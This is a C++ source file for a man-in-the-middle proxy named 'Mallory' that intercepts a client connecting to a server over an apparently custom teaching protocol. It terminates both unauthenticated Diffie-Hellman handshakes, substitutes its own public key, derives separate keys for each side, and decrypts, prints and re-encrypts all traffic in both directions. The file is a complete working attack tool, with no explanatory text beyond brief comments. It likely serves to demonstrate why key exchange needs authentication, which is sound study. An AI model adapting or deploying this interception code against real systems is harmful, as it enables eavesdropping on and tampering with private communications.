#include "crypto.h"

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <iostream>
#include <string>
#include <thread>
#include <vector>

constexpr int LISTEN_PORT = 6000;
constexpr int REAL_SERVER_PORT = 5000;

bool send_all(int fd, const std::string& data)
{
    size_t sent = 0;

    while (sent < data.size())
    {
        ssize_t n = send(fd, data.data() + sent,
                         data.size() - sent, 0);

        if (n <= 0) return false;

        sent += static_cast<size_t>(n);
    }

    return true;
}

bool send_line(int fd, const std::string& line)
{
    return send_all(fd, line + "\n");
}

bool receive_line(int fd, std::string& line)
{
    line.clear();
    char c;

    while (true)
    {
        ssize_t n = recv(fd, &c, 1, 0);

        if (n <= 0) return false;

        if (c == '\n') return true;

        if (c != '\r')
            line.push_back(c);

        if (line.size() > 1024 * 1024)
            return false;
    }
}

bool send_encrypted(
    int fd,
    const std::vector<unsigned char>& key,
    const std::string& plaintext)
{
    std::vector<unsigned char> ciphertext;

    if (!aes_gcm_encrypt(key, plaintext, ciphertext))
        return false;

    return send_line(
        fd,
        "ENC|" + base64_encode(ciphertext)
    );
}

bool receive_encrypted(
    int fd,
    const std::vector<unsigned char>& key,
    std::string& plaintext)
{
    std::string line;

    if (!receive_line(fd, line))
        return false;

    if (line.rfind("ENC|", 0) != 0)
        return false;

    std::vector<unsigned char> ciphertext;

    if (!base64_decode(line.substr(4), ciphertext))
        return false;

    return aes_gcm_decrypt(key, ciphertext, plaintext);
}

int connect_to_server(
    const std::string& ip,
    int port)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);

    if (fd < 0)
    {
        perror("socket");
        return -1;
    }

    sockaddr_in address{};
    address.sin_family = AF_INET;
    address.sin_port = htons(port);

    if (inet_pton(
            AF_INET,
            ip.c_str(),
            &address.sin_addr) != 1)
    {
        std::cerr << "[Mallory] Invalid server IP.\n";
        close(fd);
        return -1;
    }

    if (connect(
            fd,
            reinterpret_cast<sockaddr*>(&address),
            sizeof(address)) < 0)
    {
        perror("connect");
        close(fd);
        return -1;
    }

    return fd;
}

/*
 * MITM setup:
 *
 * Client <---- DH-A ----> Mallory <---- DH-B ----> Server
 *
 * Mallory terminates both DH exchanges and therefore obtains:
 *
 * K_client
 * K_server
 */
bool perform_mitm_handshake(
    int client_fd,
    int server_fd,
    std::vector<unsigned char>& client_key,
    std::vector<unsigned char>& server_key)
{
    std::string line;
    bool ok = false;

    BIGNUM* p = nullptr;
    BIGNUM* g = nullptr;
    BIGNUM* mallory_private = nullptr;
    BIGNUM* mallory_public = nullptr;
    BIGNUM* victim_public = nullptr;
    BIGNUM* client_shared = nullptr;
    BIGNUM* real_server_public = nullptr;
    BIGNUM* server_shared = nullptr;

    /* Receive the real server's group and public value. */
    if (!receive_line(server_fd, line) ||
        line.rfind("DH_P|", 0) != 0)
        goto cleanup;
    {
        std::string p_hex = line.substr(5);

        if (!receive_line(server_fd, line) ||
            line.rfind("DH_G|", 0) != 0)
            goto cleanup;
        std::string g_hex = line.substr(5);

        if (!receive_line(server_fd, line) ||
            line.rfind("DH_PUB|", 0) != 0)
            goto cleanup;
        std::string server_public_hex = line.substr(7);

        p = hex_to_bn(p_hex);
        g = hex_to_bn(g_hex);
        real_server_public = hex_to_bn(server_public_hex);

        if (!p || !g || !real_server_public)
            goto cleanup;

        /* Send the group to the victim, but replace the public value. */
        if (!send_line(client_fd, "DH_P|" + p_hex) ||
            !send_line(client_fd, "DH_G|" + g_hex))
            goto cleanup;

        mallory_private = generate_private_key(p);
        mallory_public = compute_public_key(g, mallory_private, p);

        if (!mallory_private || !mallory_public)
            goto cleanup;

        if (!send_line(client_fd,
                       "DH_PUB|" + bn_to_hex(mallory_public)))
            goto cleanup;

        if (!receive_line(client_fd, line) ||
            line.rfind("DH_CLIENT_PUB|", 0) != 0)
            goto cleanup;

        victim_public = hex_to_bn(line.substr(14));

        if (!victim_public ||
            BN_is_zero(victim_public) ||
            BN_is_one(victim_public) ||
            BN_cmp(victim_public, p) >= 0)
            goto cleanup;

        client_shared = compute_shared_secret(
            victim_public, mallory_private, p);

        if (!client_shared)
            goto cleanup;

        client_key = derive_aes_key(client_shared);

        /* Pretend to be the victim when talking to the real server. */
        if (!send_line(server_fd,
                       "DH_CLIENT_PUB|" + bn_to_hex(mallory_public)))
            goto cleanup;

        server_shared = compute_shared_secret(
            real_server_public, mallory_private, p);

        if (!server_shared)
            goto cleanup;

        server_key = derive_aes_key(server_shared);

        if (!receive_line(server_fd, line) || line != "DH_OK")
            goto cleanup;

        if (!send_line(client_fd, "DH_OK"))
            goto cleanup;

        std::cout
            << "[Mallory] Client-side fingerprint: "
            << fingerprint(client_shared) << "\n";

        std::cout
            << "[Mallory] Server-side fingerprint: "
            << fingerprint(server_shared) << "\n";

        std::cout
            << "[Mallory] Two independent DH keys established.\n";

        ok = true;
    }

cleanup:
    BN_free(p);
    BN_free(g);
    BN_free(mallory_private);
    BN_free(mallory_public);
    BN_free(victim_public);
    BN_free(client_shared);
    BN_free(real_server_public);
    BN_free(server_shared);

    return ok;
}

void client_to_server(
    int client_fd,
    int server_fd,
    std::vector<unsigned char> client_key,
    std::vector<unsigned char> server_key)
{
    while (true)
    {
        std::string plaintext;

        if (!receive_encrypted(
                client_fd, client_key, plaintext))
            break;

        /*
         * Mallory can read everything on this side.
         */
        std::cout
            << "[Mallory] CLIENT -> SERVER PLAINTEXT: "
            << plaintext
            << "\n";

        /*
         * Re-encrypt with the server-side key.
         */
        if (!send_encrypted(
                server_fd, server_key, plaintext))
            break;
    }

    shutdown(server_fd, SHUT_RDWR);
    shutdown(client_fd, SHUT_RDWR);
}

void server_to_client(
    int server_fd,
    int client_fd,
    std::vector<unsigned char> server_key,
    std::vector<unsigned char> client_key)
{
    while (true)
    {
        std::string plaintext;

        if (!receive_encrypted(
                server_fd, server_key, plaintext))
            break;

        std::cout
            << "[Mallory] SERVER -> CLIENT PLAINTEXT: "
            << plaintext
            << "\n";

        if (!send_encrypted(
                client_fd, client_key, plaintext))
            break;
    }

    shutdown(server_fd, SHUT_RDWR);
    shutdown(client_fd, SHUT_RDWR);
}

int main(int argc, char* argv[])
{
    if (argc != 2)
    {
        std::cout
            << "Usage: ./mitm <real-server-ip>\n";
        return 1;
    }

    std::string server_ip = argv[1];

    int listen_fd =
        socket(AF_INET, SOCK_STREAM, 0);

    if (listen_fd < 0)
    {
        perror("socket");
        return 1;
    }

    int opt = 1;

    setsockopt(
        listen_fd,
        SOL_SOCKET,
        SO_REUSEADDR,
        &opt,
        sizeof(opt)
    );

    sockaddr_in address{};
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(LISTEN_PORT);

    if (bind(
            listen_fd,
            reinterpret_cast<sockaddr*>(&address),
            sizeof(address)) < 0)
    {
        perror("bind");
        close(listen_fd);
        return 1;
    }

    if (listen(listen_fd, 1) < 0)
    {
        perror("listen");
        close(listen_fd);
        return 1;
    }

    std::cout
        << "====================================\n";
    std::cout
        << "          Mallory MITM Proxy\n";
    std::cout
        << "====================================\n";
    std::cout
        << "[Mallory] Listening on port "
        << LISTEN_PORT << "\n";
    std::cout
        << "[Mallory] Real server: "
        << server_ip << ":"
        << REAL_SERVER_PORT << "\n";

    sockaddr_in victim_addr{};
    socklen_t victim_len = sizeof(victim_addr);

    int client_fd = accept(
        listen_fd,
        reinterpret_cast<sockaddr*>(&victim_addr),
        &victim_len
    );

    if (client_fd < 0)
    {
        perror("accept");
        close(listen_fd);
        return 1;
    }

    std::cout
        << "[Mallory] Victim client connected.\n";

    int server_fd =
        connect_to_server(
            server_ip,
            REAL_SERVER_PORT
        );

    if (server_fd < 0)
    {
        close(client_fd);
        close(listen_fd);
        return 1;
    }

    std::cout
        << "[Mallory] Connected to real server.\n";

    std::vector<unsigned char> client_key;
    std::vector<unsigned char> server_key;

    if (!perform_mitm_handshake(
            client_fd,
            server_fd,
            client_key,
            server_key))
    {
        std::cerr
            << "[Mallory] MITM DH handshake failed.\n";

        close(client_fd);
        close(server_fd);
        close(listen_fd);
        return 1;
    }

    std::cout
        << "[Mallory] MITM active. "
        << "Traffic will be decrypted, logged, "
        << "and re-encrypted.\n";

    std::thread c2s(
        client_to_server,
        client_fd,
        server_fd,
        client_key,
        server_key
    );

    std::thread s2c(
        server_to_client,
        server_fd,
        client_fd,
        server_key,
        client_key
    );

    c2s.join();
    s2c.join();

    close(client_fd);
    close(server_fd);
    close(listen_fd);

    return 0;
}
